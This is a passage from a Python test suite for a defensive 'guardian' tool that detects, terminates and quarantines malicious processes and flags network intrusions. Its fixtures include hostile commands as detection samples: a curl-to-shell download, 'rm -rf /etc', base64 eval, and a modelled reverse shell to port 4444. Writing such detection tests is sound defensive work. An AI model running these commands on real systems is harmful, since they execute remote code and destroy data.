import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

import guardian_audit
from guardian import (
    AgentProcess,
    Config,
    Detection,
    Intrusion,
    NetworkConnection,
    anomaly_scan,
    apply_update,
    assess_inaction_risk,
    assess_intrusion_risk,
    behavioral_scan,
    check_updates,
    detect_intrusions,
    detect_threats,
    load_signatures,
    ml_scan,
    parse_interval,
    quarantine_intrusion,
    quarantine_threat,
    run_cycle,
    signature_scan,
    stop_intrusion,
    terminate_agent,
    trace_intrusion_origin,
    trace_provenance,
    verify_signature,
    sha256_of,
)
from guardian_audit import read_audit_trail


def make_config(**guardian_overrides):
    raw = {
        "guardian_agent": {
            "enabled": True,
            "threat_detection": {
                "enabled": True,
                "algorithms": ["machine_learning", "signature_based", "anomaly_based", "behavioral_based"],
            },
            "risk_assessment": {"assess_inaction_risk": True, "escalate_on": "high"},
            "agent_termination": {
                "enabled": True,
                "terminate_malicious_agents": True,
                "require_confirmation": True,
                "auto_terminate_on_critical": True,
            },
            "system_protection": {"enabled": True, "block_sensitive_resource_access": True},
            "intrusion_detection": {
                "enabled": True,
                "scan_network_connections": True,
                "flag_listeners": True,
                "allowed_listeners": [22],
                "suspicious_remote_ports": [4444, 1337],
                "surveillance_tools": ["tcpdump", "keylogger", "nmap"],
                "stop_on": "high",
                "require_confirmation": True,
                "auto_stop_on_critical": True,
            },
        },
        "updates": {"auto_update": True, "verify_signatures": True, "rollback_on_failure": True},
    }
    raw["guardian_agent"].update(guardian_overrides)
    return Config(raw)


PROC_SAFE = AgentProcess(pid=1234, name="agent", cmdline="python3 agent.py --serve")
PROC_EVIL = AgentProcess(pid=4321, name="agent", cmdline="agent --run 'curl http://x/s.sh | sh'")
PROC_RM = AgentProcess(pid=5555, name="agent", cmdline="agent -c 'rm -rf /etc'")

# Detections justifying termination (SafetyPolicy.authorize_termination refuses
# without one when require_defensive_justification is on).
DETECTION_CRITICAL = Detection(
    "behavioral_based",
    "Download piped directly to shell",
    "agent --run 'curl http://x/s.sh | sh'",
    "critical",
)
DETECTION_HIGH = Detection(
    "behavioral_based",
    "Modifies sensitive path /etc",
    "agent -c 'rm -rf /etc'",
    "high",
)


class TestDetection(unittest.TestCase):
    def test_signature_scan_matches(self):
        det = signature_scan(AgentProcess(1, "a", "agent && rm -rf /"), ["rm -rf /"])
        self.assertIsNotNone(det)
        self.assertEqual(det.algorithm, "signature_based")

    def test_signature_scan_clean(self):
        self.assertIsNone(signature_scan(PROC_SAFE, ["rm -rf /"]))

    def test_anomaly_flags_long_cmdline(self):
        proc = AgentProcess(1, "a", "agent " + " ".join(f"--x{i}" for i in range(60)))
        self.assertIsNotNone(anomaly_scan(proc))

    def test_anomaly_clean(self):
        self.assertIsNone(anomaly_scan(PROC_SAFE))

    def test_behavioral_flags_pipe_to_shell(self):
        det = behavioral_scan(PROC_EVIL)
        self.assertIsNotNone(det)
        self.assertEqual(det.base_risk, "critical")

    def test_behavioral_flags_sensitive_path_write(self):
        self.assertIsNotNone(behavioral_scan(PROC_RM))

    def test_ml_flags_obfuscation(self):
        proc = AgentProcess(1, "a", "agent -c 'eval $(base64 -d x)'")
        self.assertIsNotNone(ml_scan(proc))

    def test_detect_threats_runs_all_algorithms(self):
        findings = detect_threats(PROC_EVIL, make_config(), ["curl"])
        algos = {f.algorithm for f in findings}
        self.assertIn("behavioral_based", algos)
        self.assertIn("signature_based", algos)


class TestRiskAssessment(unittest.TestCase):
    def test_pipe_to_shell_is_critical_inaction_risk(self):
        det = behavioral_scan(PROC_EVIL)
        self.assertEqual(assess_inaction_risk(det, make_config()), "critical")

    def test_signature_match_is_high(self):
        det = signature_scan(AgentProcess(1, "a", "agent && rm -rf /"), ["rm -rf /"])
        self.assertEqual(assess_inaction_risk(det, make_config()), "high")

    def test_disabled_assessment_keeps_base_risk(self):
        cfg = make_config(risk_assessment={"assess_inaction_risk": False, "escalate_on": "high"})
        det = signature_scan(AgentProcess(1, "a", "agent && rm -rf /"), ["rm -rf /"])
        self.assertEqual(assess_inaction_risk(det, cfg), "high")

    def test_risk_ordering(self):
        cfg = make_config()
        self.assertTrue(cfg.risk_at_least("critical", "high"))
        self.assertFalse(cfg.risk_at_least("medium", "high"))


class TestTermination(unittest.TestCase):
    def test_critical_bypasses_confirmation(self):
        with patch("guardian.proc_kill") as kill:
            self.assertTrue(
                terminate_agent(PROC_EVIL, "critical", make_config(), detection=DETECTION_CRITICAL)
            )
            kill.assert_called_once_with(PROC_EVIL.pid)

    def test_high_requires_confirmation_declined(self):
        """Confirmation path: a justified high-risk termination the operator
        declines returns False, never kills, and the decline is audited."""
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("builtins.input", return_value="n"), \
                 patch("guardian.proc_kill") as kill:
                self.assertFalse(
                    terminate_agent(PROC_RM, "high", make_config(), detection=DETECTION_HIGH)
                )
                kill.assert_not_called()
            declines = [e for e in read_audit_trail(log, action_type="termination")
                        if "Termination declined" in e["description"]]
            self.assertEqual(len(declines), 1)
            self.assertEqual(declines[0]["agent_id"], str(PROC_RM.pid))
            self.assertEqual(declines[0]["risk_level"], "high")

    def test_high_requires_confirmation_accepted(self):
        with patch("builtins.input", return_value="y"), patch("guardian.proc_kill") as kill:
            self.assertTrue(
                terminate_agent(PROC_RM, "high", make_config(), detection=DETECTION_HIGH)
            )
            kill.assert_called_once()

    def test_dry_run_never_kills(self):
        with patch("guardian.proc_kill") as kill:
            self.assertTrue(
                terminate_agent(PROC_EVIL, "critical", make_config(),
                                detection=DETECTION_CRITICAL, dry_run=True)
            )
            kill.assert_not_called()

    def test_no_detection_is_refused_and_audited(self):
        """Refusal path: termination without a justifying detection is blocked
        by SafetyPolicy.require_defensive_justification and logged as a
        SAFETY REFUSAL protection entry."""
        with tempfile.TemporaryDirectory() as d:
            log = Path(d) / "audit.log"
            with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
                 patch("guardian.proc_kill") as kill:
                self.assertFalse(terminate_agent(PROC_EVIL, "critical", make_config()))
                kill.assert_not_called()
            refusals = [e for e in read_audit_trail(log, action_type="protection")
                        if "SAFETY REFUSAL" in e["description"]]
            self.assertEqual(len(refusals), 1)
            self.assertIn("no detection justifies this action", refusals[0]["description"])

    def test_termination_disabled(self):
        cfg = make_config(agent_termination={"enabled": False, "terminate_malicious_agents": True})
        with patch("guardian.proc_kill") as kill:
            self.assertFalse(terminate_agent(PROC_EVIL, "critical", cfg))
            kill.assert_not_called()


class TestUpdates(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self.old_cwd = Path.cwd()
        import os
        os.chdir(self.dir)

    def tearDown(self):
        import os
        os.chdir(self.old_cwd)
        self.tmp.cleanup()

    def make_update(self, content=b"payload", sign=True):
        f = self.dir / "update.sh"
        f.write_bytes(content)
        if sign:
            f.with_suffix(".sh.sig").write_text(sha256_of(f))
        return f

    def test_verify_signature_ok(self):
        f = self.make_update()
        self.assertTrue(verify_signature(f, f.with_suffix(".sh.sig")))

    def test_verify_signature_missing(self):
        f = self.make_update(sign=False)
        self.assertFalse(verify_signature(f, f.with_suffix(".sh.sig")))

    def test_verify_signature_tampered(self):
        f = self.make_update()
        f.write_bytes(b"tampered")
        self.assertFalse(verify_signature(f, f.with_suffix(".sh.sig")))

    def test_unsigned_update_quarantined(self):
        f = self.make_update(sign=False)
        self.assertFalse(apply_update(f, make_config()))
        self.assertFalse(f.exists())
        self.assertTrue((self.dir / "quarantine" / "update.sh").exists())

    def test_quarantined_update_reports_evidence_and_origin(self):
        """A rejected update is quarantined with a sha256 evidence hash, its
        origin (the inbox path) reported in the audit trail and via alert."""
        import guardian as g
        f = self.make_update(sign=False)
        log = self.dir / "audit.log"
        alerts = []
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log), \
             patch.object(g, "send_alert", lambda msg, **kw: alerts.append((msg, kw))):
            self.assertFalse(apply_update(f, make_config()))
        entries = read_audit_trail(log, action_type="update")
        rejected = [e for e in entries if "quarantined" in e["description"]]
        self.assertEqual(len(rejected), 1)
        self.assertEqual(rejected[0]["details"]["sha256"],
                         sha256_of(Path(self.dir / "quarantine" / "update.sh")))
        self.assertEqual(rejected[0]["details"]["source"], str(f))
        self.assertEqual(len(alerts), 1)  # report sent
        self.assertIn("origin", alerts[0][0])

    def test_signed_update_applied(self):
        f = self.make_update()
        self.assertTrue(apply_update(f, make_config()))
        self.assertTrue(f.exists())

    def test_rollback_on_failure_snapshots_backup(self):
        """updates.rollback_on_failure snapshots the file into backups/ before
        staging. NOTE: the current apply step is a stub
        (``applied_ok = file_path.exists()``), so the restore-from-backup
        branch is unreachable until a real apply step lands — this test covers
        the backup-creation behavior only."""
        f = self.make_update()
        self.assertTrue(apply_update(f, make_config()))
        backup = self.dir / "backups" / "update.sh"
        self.assertTrue(backup.exists())
        self.assertEqual(backup.read_bytes(), b"payload")

    def test_no_backup_when_rollback_disabled(self):
        cfg = make_config()
        cfg.raw["updates"]["rollback_on_failure"] = False
        f = self.make_update()
        self.assertTrue(apply_update(f, cfg))
        self.assertFalse((self.dir / "backups" / "update.sh").exists())


class TestCheckUpdates(unittest.TestCase):
    def setUp(self):
        import os
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self.old_cwd = os.getcwd()
        os.chdir(self.dir)
        self.inbox = self.dir / "updates" / "inbox"
        self.inbox.mkdir(parents=True)

    def tearDown(self):
        import os
        os.chdir(self.old_cwd)
        self.tmp.cleanup()

    def drop_update(self, name, content=b"payload", sign=True):
        f = self.inbox / name
        f.write_bytes(content)
        if sign:
            f.with_suffix(f.suffix + ".sig").write_text(sha256_of(f))
        return f

    def test_signed_update_applied_automatically(self):
        self.drop_update("a.sh")
        self.assertEqual(check_updates(make_config()), 1)

    def test_unsigned_update_quarantined_not_applied(self):
        self.drop_update("evil.sh", sign=False)
        self.assertEqual(check_updates(make_config()), 0)
        self.assertFalse((self.inbox / "evil.sh").exists())
        self.assertTrue((self.dir / "quarantine" / "evil.sh").exists())

    def test_signature_files_not_treated_as_updates(self):
        self.drop_update("a.sh")
        self.drop_update("b.sh", content=b"other")
        self.assertEqual(check_updates(make_config()), 2)

    def test_missing_inbox_is_noop(self):
        import shutil
        shutil.rmtree(self.inbox)
        self.assertEqual(check_updates(make_config()), 0)

    def test_empty_inbox_is_noop(self):
        self.assertEqual(check_updates(make_config()), 0)

    def test_auto_update_disabled_refuses_and_audits(self):
        self.drop_update("a.sh")
        cfg = make_config()
        cfg.raw["updates"]["auto_update"] = False
        log = self.dir / "audit.log"
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
            self.assertEqual(check_updates(cfg), 0)
        self.assertTrue((self.inbox / "a.sh").exists())  # untouched
        actions = [a["description"] for a in read_audit_trail(log, action_type="update")]
        self.assertTrue(any("auto_update is false" in a for a in actions))

    def test_update_sweep_is_audited(self):
        self.drop_update("a.sh")
        log = self.dir / "audit.log"
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", log):
            check_updates(make_config())
        actions = [a["description"] for a in read_audit_trail(log, action_type="update")]
        self.assertTrue(any("Applied update a.sh" in a for a in actions))
        self.assertTrue(any("Update check complete: 1/1 applied" in a for a in actions))

    def test_dry_run_logs_without_applying(self):
        f = self.drop_update("a.sh")
        self.assertEqual(check_updates(make_config(), dry_run=True), 1)
        self.assertTrue(f.exists())
        self.assertFalse((self.dir / "backups" / "a.sh").exists())


class TestParseInterval(unittest.TestCase):
    def test_units(self):
        self.assertEqual(parse_interval("45m"), 2700.0)
        self.assertEqual(parse_interval("30s"), 30.0)
        self.assertEqual(parse_interval("1h"), 3600.0)
        self.assertEqual(parse_interval("2d"), 172800.0)

    def test_plain_seconds(self):
        self.assertEqual(parse_interval("90"), 90.0)
        self.assertEqual(parse_interval(120), 120.0)

    def test_garbage_falls_back_to_default(self):
        self.assertEqual(parse_interval("soon", default=7.0), 7.0)
        self.assertEqual(parse_interval(None, default=3.0), 3.0)


class TestSignaturesDB(unittest.TestCase):
    def test_loads_from_db(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "sigs.json"
            p.write_text(json.dumps({"signatures": ["evil-cmd"]}))
            self.assertEqual(load_signatures(p), ["evil-cmd"])

    def test_falls_back_to_defaults(self):
        sigs = load_signatures(Path("/nonexistent.json"))
        self.assertIn("rm -rf /", sigs)


class TestTraceProvenance(unittest.TestCase):
    def test_walks_ancestor_chain_to_origin(self):
        """Provenance traces the exact parent chain to where the threat came from."""
        with patch("guardian.os.readlink", side_effect=OSError("gone")), \
             patch("guardian.subprocess.run") as run:
            run.return_value = type("R", (), {"stdout": "1001 sshd 'sshd: session'\n1 init /sbin/init\n"})()
            prov = trace_provenance(AgentProcess(4321, "agent", "agent evil", ppid=1001))
        self.assertEqual(prov["ppid"], 1001)
        self.assertEqual(prov["ancestors"],
                         [{"pid": 1001, "name": "sshd", "cmdline": "sshd: session"}])
        run.assert_called_once()

    def test_parent_gone_stops_walk(self):
        with patch("guardian.os.readlink", side_effect=OSError("gone")), \
             patch("guardian.subprocess.run") as run:
            run.return_value = type("R", (), {"stdout": ""})()
            prov = trace_provenance(AgentProcess(4321, "agent", "agent evil", ppid=9999))
        self.assertEqual(prov["ancestors"], [])
        self.assertEqual(prov["exe"], "")
        self.assertEqual(prov["cwd"], "")

    def test_init_parent_means_no_ancestors(self):
        with patch("guardian.os.readlink", side_effect=OSError("gone")), \
             patch("guardian.subprocess.run") as run:
            prov = trace_provenance(AgentProcess(4321, "agent", "agent evil", ppid=1))
        self.assertEqual(prov["ancestors"], [])
        run.assert_not_called()


class TestQuarantineThreat(unittest.TestCase):
    def setUp(self):
        import os
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self.old_cwd = os.getcwd()
        os.chdir(self.dir)
        self.log = self.dir / "audit.log"

    def tearDown(self):
        import os
        os.chdir(self.old_cwd)
        self.tmp.cleanup()

    def test_quarantines_exe_and_evidence_with_provenance(self):
        """Allowed path: the threat binary and an evidence record (including the
        traced origin) land in quarantine/, audited, and reported via alert."""
        exe = self.dir / "evil.bin"
        exe.write_bytes(b"malicious")
        proc = AgentProcess(4321, "agent", "agent evil", ppid=1)
        prov = {"exe": str(exe), "cwd": str(self.dir),
                "ancestors": [{"pid": 100, "name": "sshd", "cmdline": "sshd"}]}
        alerts = []
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
             patch("guardian.trace_provenance", return_value=prov), \
             patch("guardian.send_alert", lambda msg, **kw: alerts.append((msg, kw))):
            target = quarantine_threat(proc, DETECTION_HIGH, "high", make_config())
        self.assertEqual(target, Path("quarantine") / "pid4321-evil.bin")
        self.assertEqual(Path(target).read_bytes(), b"malicious")
        record = self.dir / "quarantine" / "threat_pid4321.json"
        evidence = json.loads(record.read_text())
        self.assertEqual(evidence["threat_sha256"], sha256_of(exe))
        self.assertEqual(evidence["provenance"]["ancestors"][0]["name"], "sshd")
        self.assertEqual(evidence["process"]["pid"], 4321)
        entries = read_audit_trail(self.log, action_type="protection")
        self.assertTrue(any("Quarantined threat" in e["description"] for e in entries))
        self.assertIn("pid=100 (sshd)", entries[-1]["description"])  # origin reported
        self.assertEqual(len(alerts), 1)  # report sent
        self.assertIn("origin", alerts[0][1])

    def test_quarantines_evidence_record_when_no_exe(self):
        """No on-disk binary: the cmdline/provenance record is still quarantined."""
        proc = AgentProcess(4321, "agent", "agent evil", ppid=1)
        prov = {"exe": "", "cwd": "", "ancestors": []}
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
             patch("guardian.trace_provenance", return_value=prov), \
             patch("guardian.send_alert"):
            target = quarantine_threat(proc, DETECTION_HIGH, "high", make_config())
        self.assertIsNone(target)
        self.assertTrue((self.dir / "quarantine" / "threat_pid4321.json").exists())
        descs = [e["description"] for e in read_audit_trail(self.log, action_type="protection")]
        self.assertTrue(any("origin unknown" in d for d in descs))

    def test_refusal_path_write_denied_is_audited(self):
        """Refusal path: when SafetyPolicy denies the quarantine write, nothing is
        written and the SAFETY REFUSAL hits the audit trail."""
        import guardian as g
        exe = self.dir / "evil.bin"
        exe.write_bytes(b"malicious")
        proc = AgentProcess(4321, "agent", "agent evil", ppid=1)
        prov = {"exe": str(exe), "cwd": str(self.dir), "ancestors": []}
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
             patch("guardian.trace_provenance", return_value=prov), \
             patch.object(g.SafetyPolicy, "authorize_write",
                          lambda self_, p: g.SafetyPolicy._refuse(
                              self_, "write", "test denies quarantine write", path=str(p))), \
             patch("guardian.send_alert"):
            target = quarantine_threat(proc, DETECTION_HIGH, "high", make_config())
        self.assertIsNone(target)
        self.assertFalse((self.dir / "quarantine" / "pid4321-evil.bin").exists())
        refusals = [e for e in read_audit_trail(self.log, action_type="protection")
                    if "SAFETY REFUSAL" in e["description"]]
        # Both the exe copy and the evidence-record write are refused + audited.
        self.assertEqual(len(refusals), 2)

    def test_disabled_config_is_noop(self):
        cfg = make_config(threat_quarantine={"enabled": False})
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log):
            self.assertIsNone(quarantine_threat(PROC_EVIL, DETECTION_HIGH, "high", cfg))
        self.assertFalse((self.dir / "quarantine").exists())
        self.assertEqual(read_audit_trail(self.log), [])

    def test_dry_run_quarantines_nothing_but_audits(self):
        proc = AgentProcess(4321, "agent", "agent evil", ppid=1)
        prov = {"exe": "", "cwd": "", "ancestors": []}
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
             patch("guardian.trace_provenance", return_value=prov), \
             patch("guardian.send_alert"):
            self.assertIsNone(
                quarantine_threat(proc, DETECTION_HIGH, "high", make_config(), dry_run=True))
        self.assertFalse((self.dir / "quarantine").exists())
        descs = [e["description"] for e in read_audit_trail(self.log, action_type="protection")]
        self.assertTrue(any("DRY RUN: would quarantine" in d for d in descs))


def make_intrusion_config(**overrides):
    """Config with only the intrusion_detection section enabled."""
    raw = {
        "guardian_agent": {
            "enabled": True,
            "risk_assessment": {"assess_inaction_risk": True, "escalate_on": "high"},
            "threat_quarantine": {"enabled": True, "directory": "quarantine",
                                  "always": True, "study_and_report": True},
            "intrusion_detection": {
                "enabled": True,
                "scan_network_connections": True,
                "flag_listeners": True,
                "allowed_listeners": [22],
                "suspicious_remote_ports": [4444, 1337],
                "surveillance_tools": ["tcpdump", "keylogger", "nmap"],
                "stop_on": "high",
                "require_confirmation": True,
                "auto_stop_on_critical": True,
            },
        },
    }
    raw["guardian_agent"]["intrusion_detection"].update(overrides)
    # core_directives gates stops (least-force first, scope-limited, defensive
    # justification) — included so refusal paths are exercised honestly.
    raw["core_directives"] = {
        "protect_only": True,
        "require_defensive_justification": True,
        "scope_limited": True,
        "never_modify_system_files": True,
        "principles": ["least_force_first"],
    }
    return Config(raw)


CONN_SSHD = NetworkConnection("LISTEN", "0.0.0.0:22", "0.0.0.0:*", "sshd", 800)
CONN_BACKDOOR = NetworkConnection("LISTEN", "0.0.0.0:4444", "0.0.0.0:*", "nc", 4321)
CONN_LOOPBACK = NetworkConnection("LISTEN", "127.0.0.1:38837", "0.0.0.0:*", "agent", 4626)
CONN_WILDCARD_IDLE = NetworkConnection("LISTEN", "*:31337", "*:*", "", 0)
CONN_WILDCARD_LOCAL = NetworkConnection("LISTEN", "*:34005", "*:*", "", 0)
CONN_WILDCARD_LOCAL_PEER = NetworkConnection("ESTAB", "127.0.0.1:34005",
                                             "127.0.0.1:54320", "agent", 4626)
CONN_REVERSE = NetworkConnection("ESTAB", "10.0.0.5:51515", "203.0.113.9:4444", "bash", 777)
CONN_BENIGN = NetworkConnection("ESTAB", "10.0.0.5:51516", "93.184.216.34:443", "curl", 888)

PROC_SPY = AgentProcess(pid=9100, name="tcpdump", cmdline="tcpdump -i eth0 -w capture.pcap")
PROC_GUARDIANISH = AgentProcess(pid=9200, name="python3",
                                cmdline="python3 guardian.py --once --pattern agent")


class TestNetworkConnectionParsing(unittest.TestCase):
    SS_SAMPLE = (
        "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process\n"
        'tcp   LISTEN 0      128    0.0.0.0:22       0.0.0.0:*        users:(("sshd",pid=800,fd=3))\n'
        'tcp   ESTAB  0      0      10.0.0.5:51515   203.0.113.9:4444 users:(("bash",pid=777,fd=1))\n'
        "udp   UNCONN 0      0      127.0.0.53%lo:53 0.0.0.0:*\n"
    )

    def test_parse_ss_extracts_state_endpoints_and_process(self):
        conns = NetworkConnection.parse_ss(self.SS_SAMPLE)
        self.assertEqual(len(conns), 3)
        sshd = conns[0]
        self.assertEqual((sshd.state, sshd.local, sshd.process, sshd.pid),
                         ("LISTEN", "0.0.0.0:22", "sshd", 800))
        self.assertEqual(conns[2].process, "")  # no users: field
        # Rows without a process column: local/remote are the last two fields.
        self.assertEqual((conns[2].local, conns[2].remote),
                         ("127.0.0.53%lo:53", "0.0.0.0:*"))

    def test_split_host_port_strips_interface_scope(self):
        from guardian import _split_host_port, _is_loopback_host
        host, port = _split_host_port("127.0.0.53%lo:53")
        self.assertEqual((host, port), ("127.0.0.53", 53))
        self.assertTrue(_is_loopback_host(host))  # systemd-resolved is loopback
        host, port = _split_host_port("[fe80::1%eth0]:8080")
        self.assertEqual((host, port), ("fe80::1", 8080))

    def test_parse_ss_skips_malformed_lines(self):
        self.assertEqual(NetworkConnection.parse_ss("header\ntoo short\n"), [])


class TestDetectIntrusions(unittest.TestCase):
    def test_flags_unknown_listener_as_backdoor(self):
        findings = detect_intrusions(make_intrusion_config(),
                                     conns=[CONN_BACKDOOR], procs=[])
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].kind, "listener")
        self.assertEqual(findings[0].detection.base_risk, "high")

    def test_allowed_listener_port_not_flagged(self):
        findings = detect_intrusions(make_intrusion_config(),
                                     conns=[CONN_SSHD], procs=[])
        self.assertEqual(findings, [])

    def test_loopback_listener_not_flagged(self):
        """Loopback-only listeners serve local processes; they are not remote
        backdoors and must not be flagged (restraint: fewest false stops)."""
        findings = detect_intrusions(make_intrusion_config(),
                                     conns=[CONN_LOOPBACK], procs=[])
        self.assertEqual(findings, [])

    def test_scoped_loopback_listener_not_flagged(self):
        """systemd-resolved style 127.0.0.53%lo:53 must never be flagged."""
        scoped = NetworkConnection("LISTEN", "127.0.0.53%lo:53", "0.0.0.0:*", "", 0)
        findings = detect_intrusions(make_intrusion_config(),
                                     conns=[scoped], procs=[])
        self.assertEqual(findings, [])

    def test_wildcard_listener_with_only_loopback_peers_not_flagged(self):
        """Wildcard dual-stack listeners whose observed traffic is all loopback
        (local dev-server/IPC pattern) are not remote backdoors."""
        findings = detect_intrusions(make_intrusion_config(),
                                     conns=[CONN_WILDCARD_LOCAL,
                                            CONN_WILDCARD_LOCAL_PEER], procs=[])
        self.assertEqual(findings, [])

    def test_idle_wildcard_listener_flagged_once_per_port(self):
        """A wildcard listener with no observed traffic has unknown exposure:
        flag it, but only once per port even across address families."""
        dup = NetworkConnection("LISTEN", "0.0.0.0:31337", "0.0.0.0:*", "nc", 4321)
        findings = detect_intrusions(make_intrusion_config(),
                                     conns=[CONN_WILDCARD_IDLE, dup], procs=[])
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].kind, "listener")

    def test_reverse_shell_connection_is_critical(self):
        findings = detect_intrusions(make_intrusion_config(),
                                     conns=[CONN_REVERSE], procs=[])
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].kind, "reverse_shell")
        self.assertEqual(findings[0].detection.base_risk, "critical")

    def test_benign_https_connection_not_flagged(self):
        findings = detect_intrusions(make_intrusion_config(),
                                     conns=[CONN_BENIGN], procs=[])
        self.assertEqual(findings, [])

    def test_flags_surveillance_tool(self):
        findings = detect_intrusions(make_intrusion_config(),
                                     conns=[], procs=[PROC_SPY])
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].kind, "surveillance")
        self.assertEqual(findings[0].pid, PROC_SPY.pid)

    def test_never_flags_guardian_process(self):
        """The defender must never mistake itself for the surveillor."""
        cfg = make_intrusion_config(surveillance_tools=["python", "guardian"])
        findings = detect_intrusions(cfg, conns=[], procs=[PROC_GUARDIANISH])
        self.assertEqual(findings, [])

    def test_tool_name_in_argument_not_flagged(self):
        """'vim tcpdump-notes.txt' merely mentions a tool; matching is on the
        invoked program (argv[0]) and comm only (restraint)."""
        mention = AgentProcess(pid=9300, name="vim", cmdline="vim tcpdump-notes.txt")
        findings = detect_intrusions(make_intrusion_config(), conns=[], procs=[mention])
        self.assertEqual(findings, [])

    def test_disabled_section_is_noop(self):
        cfg = make_intrusion_config(enabled=False)
        findings = detect_intrusions(cfg, conns=[CONN_BACKDOOR], procs=[PROC_SPY])
        self.assertEqual(findings, [])

    def test_network_scan_disabled_still_flags_surveillance(self):
        cfg = make_intrusion_config(scan_network_connections=False)
        findings = detect_intrusions(cfg, conns=[CONN_BACKDOOR], procs=[PROC_SPY])
        self.assertEqual([f.kind for f in findings], ["surveillance"])


class TestIntrusionRisk(unittest.TestCase):
    def test_reverse_shell_is_critical_inaction_risk(self):
        intr = Intrusion("reverse_shell", CONN_REVERSE,
                         Detection("intrusion_detection", "desc", "m", "critical"),
                         "bash", 777)
        self.assertEqual(assess_intrusion_risk(intr, make_intrusion_config()), "critical")

    def test_disabled_assessment_keeps_base_risk(self):
        cfg = make_intrusion_config()
        cfg.raw["guardian_agent"]["risk_assessment"] = {"assess_inaction_risk": False}
        intr = Intrusion("listener", CONN_BACKDOOR,
                         Detection("intrusion_detection", "desc", "m", "high"), "nc", 4321)
        self.assertEqual(assess_intrusion_risk(intr, cfg), "high")


class TestTraceIntrusionOrigin(unittest.TestCase):
    def test_origin_includes_remote_endpoint_and_real_provenance(self):
        """Patch at the /proc + ps boundaries so the real ppid wiring and the
        ancestor walk are exercised (not mocked away)."""
        intr = Intrusion("reverse_shell", CONN_REVERSE,
                         Detection("intrusion_detection", "desc", "m", "critical"),
                         "bash", 777)
        stat = "777 (bash) S 100 777 777 0 -1 4194304 100 0 0 0 0 0 0 0"
        with patch("guardian.Path.read_text", return_value=stat), \
             patch("guardian.os.readlink", side_effect=OSError("gone")), \
             patch("guardian.subprocess.run") as run:
            run.return_value = type("R", (), {"stdout": "1 sshd 'sshd: session'\n"})()
            origin = trace_intrusion_origin(intr)
        self.assertEqual(origin["remote_host"], "203.0.113.9")
        self.assertEqual(origin["remote_port"], 4444)
        self.assertEqual(origin["ancestors"],
                         [{"pid": 100, "name": "sshd", "cmdline": "sshd: session"}])

    def test_surveillance_origin_has_no_remote(self):
        intr = Intrusion("surveillance", None,
                         Detection("intrusion_detection", "desc", "m", "high"),
                         "tcpdump", 9100)
        stat = "9100 (tcpdump) S 1 9100 9100 0 -1 4194304 100 0 0 0 0 0 0 0"
        with patch("guardian.Path.read_text", return_value=stat), \
             patch("guardian.os.readlink", side_effect=OSError("gone")), \
             patch("guardian.subprocess.run") as run:
            origin = trace_intrusion_origin(intr)
        self.assertNotIn("remote_host", origin)
        self.assertEqual(origin["ancestors"], [])  # ppid 1: nothing to walk
        run.assert_not_called()


class TestQuarantineIntrusion(unittest.TestCase):
    def setUp(self):
        import os
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self.old_cwd = os.getcwd()
        os.chdir(self.dir)
        self.log = self.dir / "audit.log"

    def tearDown(self):
        import os
        os.chdir(self.old_cwd)
        self.tmp.cleanup()

    def make_intr(self, kind="reverse_shell", conn=CONN_REVERSE, risk="critical"):
        return Intrusion(kind, conn,
                         Detection("intrusion_detection", "test detection", "m", risk),
                         "bash", 777)

    def test_quarantines_evidence_with_origin_and_reports(self):
        """Allowed path: evidence record (with remote origin) lands in
        quarantine/, is audited, and is reported via alert."""
        alerts = []
        origin = {"kind": "reverse_shell", "process": "bash", "pid": 777,
                  "remote_host": "203.0.113.9", "remote_port": 4444}
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
             patch("guardian.trace_intrusion_origin", return_value=origin), \
             patch("guardian.send_alert", lambda msg, **kw: alerts.append((msg, kw))):
            record = quarantine_intrusion(self.make_intr(), "critical",
                                          make_intrusion_config())
        self.assertEqual(record, Path("quarantine") / "intrusion_reverse_shell_pid777.json")
        evidence = json.loads((self.dir / record).read_text())
        self.assertEqual(evidence["origin"]["remote_host"], "203.0.113.9")
        self.assertEqual(evidence["intrusion"]["connection"]["remote"],
                         "203.0.113.9:4444")
        entries = read_audit_trail(self.log, action_type="protection")
        self.assertTrue(any("Quarantined intrusion evidence" in e["description"]
                            for e in entries))
        self.assertIn("203.0.113.9", entries[-1]["description"])  # origin reported
        self.assertEqual(len(alerts), 1)  # report sent
        self.assertIn("origin", alerts[0][1])

    def test_refusal_path_write_denied_is_audited(self):
        """Refusal path: SafetyPolicy denies the evidence write; nothing is
        written and the SAFETY REFUSAL hits the audit trail."""
        import guardian as g
        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
             patch("guardian.trace_intrusion_origin", return_value={"kind": "x"}), \
             patch.object(g.SafetyPolicy, "authorize_write",
                          lambda self_, p: g.SafetyPolicy._refuse(
                              self_, "write", "test denies intrusion write", path=str(p))), \
             patch("guardian.send_alert"):
            record = quarantine_intrusion(self.make_intr(), "critical",
                                          make_intrusion_config())
        self.assertIsNone(record)
        self.assertFalse((self.dir / "quarantine" / "intrusion_reverse_shell_pid777.json").exists())
        refusals = [e for e in read_audit_trail(self.log, action_type="protection")
                    if "SAFETY REFUSAL" in e["description"]]
        self.assertEqual(len(refusals), 1)

    def test_dry_run_writes_nothing_but_audits(self):
